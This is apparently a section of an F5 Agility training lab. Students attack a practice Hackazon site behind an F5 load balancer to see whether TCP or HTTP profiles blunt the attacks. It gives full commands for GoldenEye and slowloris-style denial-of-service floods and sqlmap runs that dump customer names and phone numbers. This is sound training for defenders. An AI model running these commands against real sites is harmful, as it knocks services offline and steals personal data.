Attack Web App behind LTM
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Before we put F5’s WAF into the mix, lets run some of the same
       attacks with the resource behind LTM

-  We will start our testing with LTM configured with **only** a TCP
       profile. Let’s examine the impact of a L4 vs L7 proxy.

-  *Will a L4 (TCP) or L7 (HTTP) profile mitigate attacks?*

-  Estimated time for completion: 30 minutes

1. Attack via GoldenEye

   a. (Kali) Browse to GoldenEye directory and execute attack.

      i.  # cd /root/Agility/GoldenEye

      ii. # ./goldeneye.py http://hackazon-tcp.f5agility.com -d -w 50 -s
          200

   b. Observe impact

      i.   Is site available?

      ii.  Review LTM virtual Server statistics

      iii. (Hackazon) Server Stats

           1. # top

           2. # free –m

   c. (Kali) Stop attack

      i. <Ctrl>+C

2. Attack via SLOWHTTPTEST

   a. (Kali) Browse to slowhttptest directory and execute attack

      i.  # cd /root/Agility/slowhttptest

      ii. # slowhttptest -c 1000 -H -g -o slowloris\_stats\_lab3 -i 10
          -r 200 -s 8192 -t GET -u http://hackazon-tcp.f5agility.com -x
          24 -p 3

   b. Observe impact

      i.   Is site available?

      ii.  Review LTM virtual Server statistics

      iii. Review LTM Dashboard

      iv.  (Hackazon) Server Stats

           1. # top

           2. # free –m

   c. Stop Attack

      i. <Ctrl>+C

   d. # /etc/init.d/httpd restart

3. Attack via SQLMap

   a. (Kali) Repeat SQL Injection from previous lab

      i.   # cd /root/Agility/sqlmap

      ii.  # sqlmap -u
           http://hackazon-tcp.f5agility.com/product/view?id=51 --dbs

      iii. # sqlmap -u
           http://hackazon-tcp.f5agility.com/product/view?id=51 -D
           hackazon --tables

      iv.  # sqlmap -u
           http://hackazon-tcp.f5agility.com/product/view?id=51 -D
           hackazon -T tbl\_customer\_address --columns

      v.   # sqlmap -u
           http://hackazon-tcp.f5agility.com/product/view?id=51 -D
           hackazon -T tbl\_customer\_address -C full\_name,phone,zip
           --dump

   b. Observe impact

      i.  Is site available?

      ii. (Hackazon) Server Stats

          1. # top

          2. # free –m

4. Repeat steps 1-6 with host below and note differences

   a. http://hackazon-http.f5agility.com
